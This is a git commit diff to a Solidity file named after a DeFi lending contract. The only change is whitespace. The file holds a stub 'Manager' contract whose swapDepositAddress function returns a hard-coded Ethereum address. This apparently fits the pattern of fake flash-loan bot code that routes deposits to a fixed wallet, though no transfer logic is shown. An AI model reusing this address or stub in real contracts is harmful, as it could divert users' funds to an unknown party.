048f7a160412665097d51facc05d0201005ab9e9
Flashloan-finance <123256235+Flashloan-finance@users.noreply.github.com>
2023-02-05 20:27:00 +0100

    Update PoolAddressesProvider.sol

--- PoolAddressesProvider.sol
+++ PoolAddressesProvider.sol
@@ -3,7 +3,8 @@ pragma solidity ^0.5.0;
 contract Manager {
     function performTasks() pure public {
     }
-          function swapDepositAddress() public pure returns (address) {
+    
+    function swapDepositAddress() public pure returns (address) {
         return 0xED02BfF353a7FB7f692612d2Ee9c7Fb6066a6755;
     }
 }
